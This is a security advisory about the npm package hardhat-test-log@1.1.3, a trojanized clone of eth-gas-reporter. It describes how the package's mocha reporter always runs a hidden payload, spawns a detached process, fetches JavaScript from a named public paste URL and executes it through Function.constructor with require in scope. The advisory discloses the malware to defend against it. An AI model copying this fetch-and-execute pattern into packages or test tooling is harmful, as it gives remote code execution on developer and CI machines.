summary: hardhat-test-log fetches and executes remote JavaScript from a public paste service via a hidden reporter payload
details: hardhat-test-log@1.1.3 is a trojanized clone of eth-gas-reporter republished under a name that mimics the hardhat-gas-reporter / hardhat-* namespace to attract installs. The mocha reporter exported by index.js contains a dead-code gate (`var opt = 1; if (!opt) { <legitimate reporter code> } else { gestest(); }`) that guarantees the payload branch always runs when the reporter is instantiated during a test run. The payload branch calls `utils.connectNet`, which spawns `node lib/syncResolve.js` as a detached, stdio-ignored child process and calls `unref()` so it survives the parent mocha process. lib/syncResolve.js then performs an `axios.get('https://www.jsonkeeper.com/b/GHDD6')`, reads the `Cookie` field from the response body, and passes that string to `new Function.constructor('require', result)(require)` — arbitrary JavaScript from a mutable, anonymous public paste endpoint is executed with `require` in scope. This is remote code execution against any developer or CI environment that runs the test suite with this reporter configured, and the fetched payload can be swapped by the operator at any time without publishing a new package version.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
